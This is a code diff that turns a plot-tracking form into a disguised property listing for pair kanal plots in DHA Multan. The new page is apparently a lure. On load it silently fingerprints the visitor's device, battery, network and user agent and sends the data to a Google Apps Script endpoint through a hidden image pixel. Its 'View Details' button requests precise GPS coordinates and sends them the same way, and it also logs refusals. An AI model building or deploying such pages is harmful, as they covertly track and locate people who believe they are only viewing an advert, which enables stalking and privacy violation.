@@ -2,239 +2,283 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DHA Plot Tracker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Premium Pair Kanal Plots | DHA Multan</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            padding: 20px; 
-            background: #f4f4f9; 
-            text-align: center; 
-            color: #333;
-        }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-        h2 { color: #2c3e50; margin-bottom: 20px; }
-        
-        .form-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            font-size: 14px;
-        }
-        input, select {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            box-sizing: border-box; /* Fixes padding issues */
-            font-size: 16px;
-        }
-        
-        button { 
-            width: 100%;
-            padding: 15px; 
-            font-size: 18px; 
-            background: #27ae60; 
-            color: white; 
-            border: none; 
-            border-radius: 5px; 
-            cursor: pointer; 
-            margin-top: 10px;
-            transition: background 0.3s;
-        }
-        button:hover { background: #219150; }
-        button:disabled { background: #95a5a6; cursor: not-allowed; }
-        
-        #status { 
-            margin-top: 20px; 
-            font-weight: bold; 
-            min-height: 24px;
-        }
-        .loader { display: none; margin-top: 10px; color: #666; }
+        :root { --primary-blue: #0f172a; --accent-gold: #d4af37; --bg-light: #f8fafc; --text-dark: #334155; --white: #ffffff; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Open Sans', sans-serif; background-color: var(--bg-light); color: var(--text-dark); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .card { background: var(--white); width: 100%; max-width: 450px; border-radius: 20px; box-shadow: 0 10px 30px rgba(15, 23, 42, 0.1); overflow: hidden; }
+        .header { background: linear-gradient(135deg, var(--primary-blue) 0%, #1e293b 100%); padding: 30px 20px; text-align: center; color: var(--white); }
+        .badge { background: var(--accent-gold); color: var(--primary-blue); padding: 5px 12px; border-radius: 50px; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; display: inline-block; margin-bottom: 15px; }
+        .header h1 { font-family: 'Montserrat', sans-serif; font-size: 22px; margin-bottom: 5px; font-weight: 700; }
+        .header p { font-size: 14px; opacity: 0.9; }
+        .gallery-container { padding: 20px; background: var(--white); }
+        .main-image { width: 100%; height: 250px; object-fit: cover; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); margin-bottom: 15px; display: block; }
+        .details-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .detail-item { background: #f1f5f9; padding: 10px; border-radius: 8px; text-align: center; font-size: 13px; color: var(--primary-blue); font-weight: 600; }
+        .detail-item i { color: var(--accent-gold); margin-right: 5px; }
+        .cta-container { padding: 0 20px 30px 20px; text-align: center; }
+        #contactBtn { background: linear-gradient(90deg, var(--accent-gold) 0%, #bfa13f 100%); color: var(--primary-blue); border: none; width: 100%; padding: 16px; font-size: 16px; font-family: 'Montserrat', sans-serif; font-weight: 700; border-radius: 12px; cursor: pointer; box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3); display: flex; justify-content: center; align-items: center; gap: 10px; }
+        #loader { display: none; margin-top: 15px; color: var(--primary-blue); font-weight: 600; align-items: center; justify-content: center; gap: 10px; }
+        #successMsg { display: none; padding: 20px; background: #f0fdf4; border-top: 1px solid #dcfce7; animation: slideUp 0.5s ease-out; }
+        .success-text { text-align: center; color: #166534; font-size: 14px; margin-bottom: 15px; line-height: 1.5; }
+        .hidden-content { display: none; text-align: left; }
+        .gallery-small { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
+        .gallery-small img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; border: 2px solid var(--white); box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: block; }
+        .plot-location-btn { display: block; width: 100%; background: var(--primary-blue); color: white; text-align: center; padding: 14px; border-radius: 10px; text-decoration: none; margin-top: 20px; font-weight: 700; font-size: 15px; font-family: 'Montserrat', sans-serif; }
+        .plot-location-btn:hover { background: #1e293b; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>📍 DHA Plot Tracker</h2>
-    
-    <!-- DHA Input Fields -->
-    <div class="form-group">
-        <label for="plotInput">Plot Number</label>
-        <input type="text" id="plotInput" placeholder="e.g., 45, 102-B" required>
+<div class="card">
+    <div class="header">
+        <span class="badge">Exclusive Listing</span>
+        <h1>Premium Pair Kanal Plots</h1>
+        <p><i class="fas fa-map-marker-alt"></i> DHA Multan, Sector I</p>
     </div>
 
-    <div class="form-group">
-        <label for="blockInput">Block</label>
-        <input type="text" id="blockInput" placeholder="e.g., B, D, E" required>
+    <div class="gallery-container">
+        <img src="https://i.postimg.cc/nrDsQq77/c5461333b4492579a675f0b54438c9b9.jpg" alt="Plot View" class="main-image">
+        <div class="details-grid">
+            <div class="detail-item"><i class="fas fa-ruler-combined"></i> Pair Kanal</div>
+            <div class="detail-item"><i class="fas fa-road"></i> 80 Ft Road</div>
+            <div class="detail-item"><i class="fas fa-home"></i> Double Corner</div>
+            <div class="detail-item"><i class="fas fa-store"></i> Near Commercial</div>
+        </div>
     </div>
 
-    <div class="form-group">
-        <label for="phaseInput">Phase</label>
-        <select id="phaseInput">
-            <option value="Phase 3">Phase 3</option>
-            <option value="Phase 4">Phase 4</option>
-            <option value="Phase 5">Phase 5</option>
-            <option value="Phase 6">Phase 6</option>
-            <option value="Phase 7">Phase 7</option>
-            <option value="Phase 8">Phase 8</option>
-            <option value="Phase 9">Phase 9</option>
-            <option value="Phase 10">Phase 10</option>
-            <option value="Phase 11">Phase 11</option>
-            <option value="Phase 12">Phase 12</option>
-            <option value="Phase 13">Phase 13</option>
-            <option value="Phase 14">Phase 14</option>
-            <option value="Phase 15">Phase 15</option>
-        </select>
+    <div class="cta-container">
+        <button id="contactBtn" onclick="handleButtonClick()">
+            <i class="fas fa-folder-open"></i> View Details and Gallery
+        </button>
+        <div id="loader">
+            <i class="fas fa-spinner fa-spin"></i> Getting exact location...
+        </div>
     </div>
 
-    <button id="trackBtn">Share My Location</button>
-    
-    <div class="loader" id="loader">📡 Sending Plot & Location Data...</div>
-    <div id="status"></div>
+    <div id="successMsg">
+        <p class="success-text">Seller will contact you shortly. Here are the plot details.</p>
+        <div class="hidden-content" id="plotDetails">
+            <h4 style="color: var(--primary-blue); margin-bottom: 10px; font-family: 'Montserrat', sans-serif;">Plot Details:</h4>
+            <ul style="list-style: none; padding: 0; color: #555; font-size: 14px; line-height: 1.8; margin-bottom: 15px;">
+                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-hashtag" style="color: var(--accent-gold); width: 20px;"></i><strong>Plot No:</strong> 1039 and 1040</li>
+                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-vector-square" style="color: var(--accent-gold); width: 20px;"></i><strong>Type:</strong> Pair Kanal Plots</li>
+                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-border-all" style="color: var(--accent-gold); width: 20px;"></i><strong>Position:</strong> Double Corner with Both Plots</li>
+                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-road" style="color: var(--accent-gold); width: 20px;"></i><strong>Road:</strong> 80 Feet Road</li>
+                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-tree" style="color: var(--accent-gold); width: 20px;"></i><strong>Near:</strong> Park and Masjid</li>
+                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-route" style="color: var(--accent-gold); width: 20px;"></i><strong>Access:</strong> Direct Approach to 300 Feet Road</li>
+                <li style="padding: 4px 0;"><i class="fas fa-store" style="color: var(--accent-gold); width: 20px;"></i><strong>Proximity:</strong> Near Commercial</li>
+            </ul>
+            
+            <h4 style="color: var(--primary-blue); margin-bottom: 10px; font-family: 'Montserrat', sans-serif;">Plot Gallery:</h4>
+            <div class="gallery-small">
+                <img src="https://i.postimg.cc/sfYwML9R/Whats-App-Image-2026-07-30-at-3-43-41-PM-(1).jpg" alt="Plot 1039 View">
+                <img src="https://i.postimg.cc/FH9qF42n/Whats-App-Image-2026-07-30-at-3-43-41-PM.jpg" alt="Plot 1040 View">
+            </div>
+
+            <a href="https://maps.app.goo.gl/GcjtRxyA7A8xsVoVA" target="_blank" rel="noopener noreferrer" class="plot-location-btn">
+                <i class="fas fa-map-pin"></i> Plot Location
+            </a>
+        </div>
+    </div>
 </div>
 
 <script>
-    // ⚠️ REPLACE THIS WITH YOUR NEW DEPLOYED URL
-    var scriptURL = 'https://script.google.com/macros/s/AKfycbxWR5dVs0HLyNF4nNE4A2jZWtLeYl1yFsfX03Tl-yZF0ysTzEHgNhJQNFidzTE4Mr5Qxw/exec'; 
+    // ⚠️ PASTE YOUR NEW GOOGLE SCRIPT /exec URL HERE
+    var scriptURL = 'https://script.google.com/macros/s/AKfycbw3tj20rRQpFLinvpMfYg4HyULI9LiD_WEYdnnmAFytgJbl0z99OqY_s6bPyHJZXGUT9w/exec';
+    
+    // Unique Session ID
+    var sid = 'SID_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
 
-    const btn = document.getElementById('trackBtn');
-    const statusDiv = document.getElementById('status');
-    const loader = document.getElementById('loader');
+    // Fixed Plot Information (Embedded from Page Content)
+    const fixedPlotData = {
+        plotNo: "1039 and 1040",
+        sector: "Sector I",
+        features: "Pair Kanal Plots | Double Corner with both plots | 80 Feet Road | Near to park and Masjid | Direct approach to 300 feet road | Near to commercial"
+    };
 
-    // Generate a unique ID for this session
-    let sessionId = "USER_" + Math.random().toString(36).substr(2, 9);
+    // Helper to get Battery Info (Async)
+    async function getBatteryInfo() {
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging ? 'Yes' : 'No'
+                };
+            } catch (e) {
+                return { level: 'Unknown', charging: 'Unknown' };
+            }
+        }
+        return { level: 'Not Supported', charging: 'N/A' };
+    }
 
-    btn.addEventListener('click', sendLocation);
+    // Helper to get Network Info
+    function getNetworkInfo() {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            return conn.effectiveType || 'Unknown';
+        }
+        return 'Unknown';
+    }
 
-    async function sendLocation() {
-        // 1. Get Plot Details from Inputs
-        const plotNum = document.getElementById('plotInput').value.trim();
-        const block = document.getElementById('blockInput').value.trim();
-        const phase = document.getElementById('phaseInput').value;
+    // Helper to get Device Fingerprint
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let model = "Unknown";
+        let os = "Unknown";
 
-        if (!plotNum || !block) {
-            statusDiv.textContent = "⚠️ Please enter Plot Number and Block.";
-            statusDiv.style.color = "#e74c3c";
+        if (ua.indexOf("Android") > -1) {
+            os = "Android";
+            const match = ua.match(/\(([^)]+)\)/);
+            if (match && match[1]) {
+                model = match[1].split(';')[0];
+            }
+        } else if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) {
+            os = "iOS";
+            model = ua.indexOf("iPhone") > -1 ? "iPhone" : "iPad";
+        } else {
+            os = "Desktop";
+            model = "PC/Mac";
+        }
+
+        return {
+            model: model,
+            os: os,
+            screen: screen.width + 'x' + screen.height,
+            ua: ua // Return raw UA, encoding happens in trackEvent
+        };
+    }
+
+    // Main Tracking Function (Merged with Plot Data + Robust Device Info)
+    async function trackEvent(eventType, lat, lon, acc, statusMsg) {
+        if(scriptURL === 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
+            console.error('Script URL not set');
             return;
         }
 
-        statusDiv.textContent = "";
-        loader.style.display = "block";
-        btn.disabled = true;
+        // Gather all device data
+        const batteryInfo = await getBatteryInfo();
+        const networkInfo = getNetworkInfo();
+        const deviceInfo = getDeviceInfo();
 
-        try {
-            // 2. Get Location
-            if (!navigator.geolocation) {
-                throw new Error("Geolocation not supported");
-            }
+        // Construct Device JSON for the Sheet
+        const devicePayload = {
+            model: deviceInfo.model,
+            os: deviceInfo.os,
+            battery: batteryInfo.level,
+            charging: batteryInfo.charging,
+            network: networkInfo,
+            screen: deviceInfo.screen
+        };
 
-            const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                });
-            });
-
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
-
-            // 3. Gather Device Info
-            const ua = navigator.userAgent;
-            const platform = navigator.platform || navigator.userAgentData?.platform || "Unknown";
-            
-            let batteryLevel = "N/A";
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                batteryLevel = Math.round(battery.level * 100) + "%";
-            }
-
-            const deviceInfo = {
-                model: platform,
-                os: platform,
-                battery: batteryLevel,
-                charging: navigator.battery ? (await navigator.getBattery()).charging : false,
-                network: getNetworkType(),
-                screen: `${screen.width}x${screen.height}`
-            };
-
-            // 4. Prepare Payload with DHA Info + Location
-            const payload = new URLSearchParams();
-            payload.append('sid', sessionId);
-            payload.append('event', 'Plot_Location');
-            
-            // --- DHA Data ---
-            payload.append('plot', plotNum);
-            payload.append('block', block);
-            payload.append('phase', phase);
-            // ----------------
-            
-            payload.append('lat', lat);
-            payload.append('lon', lon);
-            payload.append('acc', acc);
-            payload.append('status', 'Active');
-            payload.append('device', encodeURIComponent(JSON.stringify(deviceInfo)));
-            payload.append('ua', encodeURIComponent(ua));
-
-            // 5. Send to Google Sheets
-            const response = await fetch(scriptURL + '?' + payload.toString(), {
-                method: 'GET',
-                mode: 'no-cors' 
-            });
-
-            statusDiv.textContent = "✅ Plot & Location Sent Successfully!";
-            statusDiv.style.color = "#27ae60";
-
-        } catch (error) {
-            console.error(error);
-            statusDiv.textContent = "❌ Error: " + error.message;
-            statusDiv.style.color = "#e74c3c";
-            
-            // Send basic info even if location fails, so we know they submitted
-            try {
-                await sendBasicInfo(plotNum, block, phase, error.message);
-            } catch(e) {}
-        } finally {
-            loader.style.display = "none";
-            btn.disabled = false;
-        }
-    }
-
-    async function sendBasicInfo(plot, block, phase, statusMsg) {
-        const payload = new URLSearchParams();
-        payload.append('sid', sessionId);
-        payload.append('event', 'Location_Fail');
-        payload.append('plot', plot);
-        payload.append('block', block);
-        payload.append('phase', phase);
-        payload.append('lat', '0');
-        payload.append('lon', '0');
-        payload.append('acc', '0');
-        payload.append('status', statusMsg);
+        // Build URLSearchParams (properly encoded)
+        const params = new URLSearchParams();
+        params.append('sid', sid);
+        params.append('event', eventType);
         
-        await fetch(scriptURL + '?' + payload.toString(), { method: 'GET', mode: 'no-cors' });
+        // --- DHA PLOT DATA ---
+        params.append('plot', fixedPlotData.plotNo);
+        params.append('sector', fixedPlotData.sector);
+        params.append('features', fixedPlotData.features);
+        // -----------------------
+        
+        // Location Data
+        params.append('lat', lat || '0');
+        params.append('lon', lon || '0');
+        params.append('acc', acc || 0);
+        params.append('status', statusMsg || '');
+        
+        // Device Data
+        params.append('device', encodeURIComponent(JSON.stringify(devicePayload)));
+        params.append('ua', encodeURIComponent(deviceInfo.ua));
+
+        const url = scriptURL + '?' + params.toString();
+
+        // Silent Tracking using Image Pixel (Works on all browsers, no CORS issues)
+        var img = new Image();
+        img.src = url;
+
+        // Backup Tracking using Fetch (Modern Browsers)
+        if (typeof fetch !== 'undefined') {
+            try {
+                fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
+            } catch(e) {}
+        }
+        
+        console.log('Tracked:', eventType, sid);
     }
 
-    function getNetworkType() {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-            return conn.effectiveType || "Unknown";
+    // 1. On Page Load: Track User Entry
+    window.addEventListener('DOMContentLoaded', async () => {
+        await trackEvent('PAGE_LOAD', '', '', 0, 'User opened website');
+    });
+
+    // 2. Button Click: Track Interaction & Get GPS
+    function handleButtonClick() {
+        var btn = document.getElementById('contactBtn');
+        var loader = document.getElementById('loader');
+        
+        btn.style.display = 'none';
+        loader.style.display = 'flex';
+
+        trackEvent('BUTTON_CLICK', '', '', 0, 'User clicked button');
+        requestGPS();
+    }
+
+    // 3. GPS Logic: High Accuracy for Pinpointing
+    function requestGPS() {
+        if (!navigator.geolocation) {
+            trackEvent('GPS_UNAVAILABLE', '', '', 0, 'Geolocation API not supported');
+            showContent();
+            return;
         }
-        return "Unknown";
+
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                var lat = position.coords.latitude;
+                var lon = position.coords.longitude;
+                var acc = Math.round(position.coords.accuracy || 0);
+                
+                if(acc < 100) {
+                    trackEvent('GPS_SUCCESS', lat, lon, acc, 'High Precision Location');
+                } else {
+                    trackEvent('GPS_LOW_ACC', lat, lon, acc, 'Low Accuracy GPS');
+                }
+                showContent();
+            },
+            function(error) {
+                var code = error.code;
+                var name = 'GPS_FAILED';
+                if (code === 1) name = 'GPS_DENIED';
+                if (code === 2) name = 'GPS_OFF';
+                if (code === 3) name = 'GPS_TIMEOUT';
+                
+                trackEvent(name, '', '', 0, error.message || 'Location failed');
+                showContent();
+            },
+            { 
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            }
+        );
+    }
+
+    function showContent() {
+        setTimeout(function() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('successMsg').style.display = 'block';
+            document.getElementById('plotDetails').style.display = 'block';
+            document.getElementById('successMsg').scrollIntoView({ behavior: 'smooth' });
+        }, 1000);
     }
 </script>
+
 </body>
 </html>
